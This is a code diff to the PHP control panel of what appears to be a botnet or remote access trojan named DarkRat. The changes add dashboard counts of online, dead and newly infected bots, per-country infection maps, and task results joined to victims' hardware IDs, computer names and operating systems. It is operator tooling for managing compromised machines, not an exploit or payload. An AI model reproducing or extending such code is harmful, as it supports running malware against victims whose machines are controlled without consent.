@@ -13,9 +13,9 @@ class Main{
 
             if(sha1($securitytoken) !== $securitytoken_row['securitytoken']) {
                 //TODO Log Bruteforce?
-                unset($_COOKIE["identifier"]);
-                unset($_COOKIE["securitytoken"]);
-                die('Try Again');
+                setcookie("identifier","",time()-(3600*24*365));
+                setcookie("securitytoken","",time()-(3600*24*365));
+                die('UPS: An error by Checking your Authentication');
             } else { //Token war korrekt
                 //Setze neuen Token
                 $neuer_securitytoken = $this->random_string();
@@ -27,34 +27,47 @@ class Main{
                 //Logge den Benutzer ein
                 $_SESSION['darkrat_userid'] = $securitytoken_row['user_id'];
             }
-
         }
     }
 
     public function index(){
-
             if(empty($_SESSION["darkrat_userid"])) {
                 die("Login Required");
             }
             //select count(*),now() as now  from bots where UNIX_TIMESTAMP(lastresponse) > UNIX_TIMESTAMP((now() + interval -3 minute))
             $sql = "SELECT *, UNIX_TIMESTAMP(lastresponse) as lastresponse, UNIX_TIMESTAMP(now()) as now FROM bots ORDER BY lastresponse DESC";
             $allbots = array();
+            $botcount = 0;
             foreach ($GLOBALS["pdo"]->query($sql) as $row) {
                 $allbots[] = $row;
+                $botcount++;
             }
-
-
-
-
              $sql = "SELECT country, count(*) as NUM FROM bots GROUP BY country";
              $return = array();
              foreach ($GLOBALS["pdo"]->query($sql) as $row) {
                  $return[ strtolower( $row["country"])] = intval ($row["NUM"]);
              }
+             //GET ONLINE CLIENTS
+            $statement = $GLOBALS["pdo"]->prepare("SELECT COUNT(*) as online FROM bots WHERE UNIX_TIMESTAMP(lastresponse) + ? > UNIX_TIMESTAMP()");
+            $result = $statement->execute(array('300')); //5 min.
+            $onlinebotcount = $statement->fetch();
+            //GET DEAD CLIENTS
+            $statement = $GLOBALS["pdo"]->prepare("SELECT COUNT(*) as dead FROM bots WHERE UNIX_TIMESTAMP(lastresponse) + ? < UNIX_TIMESTAMP()");
+            $result = $statement->execute(array('86400')); // 1 Day
+            $deadbotcount = $statement->fetch();
+            //New Clients in Last x Days
+            $statement = $GLOBALS["pdo"]->prepare("SELECT COUNT(*) as count FROM bots WHERE UNIX_TIMESTAMP(install_date) + ? < UNIX_TIMESTAMP()");
+            $result = $statement->execute(array('86400')); // 1 Day
+            $lastclientscount = $statement->fetch();
+
 
 
             $GLOBALS["tpl"]->assign("allbots", $allbots);
             $GLOBALS["tpl"]->assign("worldmap", json_encode($return));
+            $GLOBALS["tpl"]->assign("botcount", $botcount);
+            $GLOBALS["tpl"]->assign("onlinebotcount", $onlinebotcount["online"]);
+            $GLOBALS["tpl"]->assign("deadbotcount", $deadbotcount["dead"]);
+            $GLOBALS["tpl"]->assign("lastclientscount", $lastclientscount["count"]);
         }
 
        private function random_string() {
@@ -114,7 +127,7 @@ class Main{
             foreach ($GLOBALS["pdo"]->query($sql) as $row) {
                $allTasks[] = $row;
             }
-            $countrys = array();
+            $countries = array();
             foreach ($GLOBALS["pdo"]->query("SELECT country FROM bots") as $row) {
                 $countries[] = $row["country"];
             }
@@ -159,19 +172,30 @@ class Main{
             if(empty($_SESSION["darkrat_userid"])) {
                 die("Login Required");
             }
+
+
+
             $GLOBALS["template"][0] ="Main";
             $GLOBALS["template"][1] ="taskdetails";
-            $sql = "SELECT tasks_completed.bothwid, tasks_completed.status, tasks_completed.taskid, bots.country, bots.computrername, bots.operingsystem, tasks.task, tasks.command, tasks.filter, tasks.status as taskstatus FROM `tasks_completed` 
+            $sql = "SELECT  COUNT(bots.id) as NUM, tasks_completed.bothwid, tasks_completed.status, tasks_completed.taskid, bots.country, bots.computrername, bots.operingsystem, tasks.task, tasks.command, tasks.filter, tasks.status as taskstatus FROM `tasks_completed` 
             LEFT JOIN bots ON tasks_completed.bothwid = bots.hwid
             LEFT JOIN tasks ON tasks_completed.taskid = tasks.id
             WHERE tasks_completed.taskid = ?";
             $tasks = array();
             $statement =  $GLOBALS["pdo"]->prepare($sql);
-            $statement->execute(array($id));   
+            $statement->execute(array($id));
+            $worldmap = array();
             while($row = $statement->fetch(PDO::FETCH_ASSOC)) {
                 $tasks[] = $row;
+                $worldmap[ strtolower( $row["country"])] = intval ($row["NUM"]);
+            }
+            $countries = array();
+            foreach ($GLOBALS["pdo"]->query("SELECT country FROM bots") as $row) {
+                $countries[] = $row["country"];
             }
             $GLOBALS["tpl"]->assign("tasks", $tasks);
+            $GLOBALS["tpl"]->assign("countries", $countries);
+            $GLOBALS["tpl"]->assign("worldmap", json_encode($worldmap));
         }
 
         public function logout(){
